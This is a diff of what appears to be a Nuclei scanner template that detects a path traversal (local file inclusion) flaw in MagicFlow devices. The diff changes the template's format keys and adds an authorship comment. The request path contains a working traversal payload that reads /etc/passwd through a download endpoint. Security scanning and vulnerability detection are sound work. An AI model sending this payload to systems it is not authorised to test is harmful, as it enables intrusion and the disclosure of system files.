@@ -13,10 +13,8 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: magicflow,lfi
-  metadata:
-    max-request: 2
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd"
@@ -33,3 +31,5 @@ http:
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/05/30
